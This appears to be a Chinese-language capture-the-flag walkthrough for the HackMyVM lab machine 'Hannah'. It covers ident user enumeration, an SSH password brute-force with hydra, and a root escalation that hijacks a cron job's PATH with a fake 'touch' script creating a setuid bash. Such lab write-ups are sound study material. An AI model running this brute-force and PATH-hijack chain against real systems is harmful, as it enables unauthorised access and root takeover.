# hmv_hannah

# 0.简介

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Hannah  
**难度**：绿色  
**目标 IP**：192.168.205.150  
**本机 IP**：192.168.205.128

# 1.扫描

​`nmap`​起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.150
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:07 CST
Nmap scan report for 192.168.205.150
Host is up (0.00031s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
|_auth-owners: root
80/tcp  open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-robots.txt: 1 disallowed entry 
|_/enlightenment
|_http-title: Site doesn't have a title (text/html).
|_auth-owners: moksha
113/tcp open  ident?
|_auth-owners: root
MAC Address: 08:00:27:7C:E4:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 192.168.205.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.58 seconds
                                                   
```

113未知端口，优先查看

# 2.踩点

https://book.hacktricks.wiki/zh/network-services-pentesting/113-pentesting-ident.html#basic-information

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.150:113                                                                       
curl: (56) Recv failure: 连接被对方重置
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ nc 192.168.205.150 113 
hello 
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ nc -vn 192.168.205.150 113
(UNKNOWN) [192.168.205.150] 113 (auth) open
hello
                            

┌──(kali㉿kali)-[~/test]
└─$ ident-user-enum 192.168.205.150 80 22 113
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.205.150:80      moksha
192.168.205.150:22      root
192.168.205.150:113     root
                               
```

有一个moksha用户，我们尝试爆破ssh

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -l moksha -P /usr/share/wordlists/q5000.txt ssh://192.168.205.150 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-08 16:23:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task
[DATA] attacking ssh://192.168.205.150:22/
[22][ssh] host: 192.168.205.150   login: moksha   password: hannah
[STATUS] attack finished for 192.168.205.150 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-08 16:23:44

```

我第一次爆破的时候没出来，真的有点无语

```
┌──(kali㉿kali)-[~/test]
└─$ ssh moksha@192.168.205.150    
moksha@192.168.205.150's password: 
Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan  4 10:45:54 2023 from 192.168.1.51
moksha@hannah:~$ id
uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

# 3.提权

```
moksha@hannah:~$ sudo -l
-bash: sudo: orden no encontrada
moksha@hannah:~$ which sudo
moksha@hannah:~$ find / -name sudo 2>/dev/null
/usr/share/bash-completion/completions/sudo
moksha@hannah:~$ /usr/share/bash-completion/completions/sudo -l
-bash: /usr/share/bash-completion/completions/sudo: Permiso denegado
moksha@hannah:~$ ls -la /usr/share/bash-completion/completions/sudo
-rw-r--r-- 1 root root 1504 ago 12  2020 /usr/share/bash-completion/completions/sudo

```

我还以为又藏sudo呢

```
moksha@hannah:~$ ls -la
total 32
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .
drwxr-xr-x 3 root   root   4096 ene  4  2023 ..
lrwxrwxrwx 1 moksha moksha    9 ene  4  2023 .bash_history -> /dev/null
-rw-r--r-- 1 moksha moksha  220 ene  4  2023 .bash_logout
-rw-r--r-- 1 moksha moksha 3526 ene  4  2023 .bashrc
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .local
-rw-r--r-- 1 moksha moksha  807 ene  4  2023 .profile
-rw------- 1 moksha moksha   14 ene  4  2023 user.txt
-rw------- 1 moksha moksha   52 ene  4  2023 .Xauthority
moksha@hannah:~$ cd ..
moksha@hannah:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 ene  4  2023 .
drwxr-xr-x 18 root   root   4096 ene  4  2023 ..
drwxr-xr-x  3 moksha moksha 4096 ene  4  2023 moksha
moksha@hannah:/home$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
moksha@hannah:/home$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
moksha@hannah:/home$ cat /etc/cron*
cat: /etc/cron.d: Es un directorio
cat: /etc/cron.daily: Es un directorio
cat: /etc/cron.hourly: Es un directorio
cat: /etc/cron.monthly: Es un directorio
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
* * * * * root touch /tmp/enlIghtenment
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
cat: /etc/cron.weekly: Es un directorio

moksha@hannah:/tmp$ which touch
/usr/bin/touch

moksha@hannah:/tmp$ ls -la /media
total 12
drwxrwxrwx  3 root root 4096 ene  4  2023 .
drwxr-xr-x 18 root root 4096 ene  4  2023 ..
lrwxrwxrwx  1 root root    6 ene  4  2023 cdrom -> cdrom0
drwxr-xr-x  2 root root 4096 ene  4  2023 cdrom0

```

有一个定时任务，我们可以看到它的环境变量也有问题，所以

```
moksha@hannah:/tmp$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' > /media/touch
moksha@hannah:/tmp$ ls /tmp/
enlIghtenment
systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
moksha@hannah:/tmp$ chmod +x /media/touch

```

等子弹飞一会

```
moksha@hannah:/tmp$ ls
enlIghtenment  systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
sh             systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
moksha@hannah:/tmp$ ./sh -p
sh-5.1# id
uid=1000(moksha) gid=1000(moksha) euid=0(root) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

‍<!-- ##{"timestamp":1739012133}## -->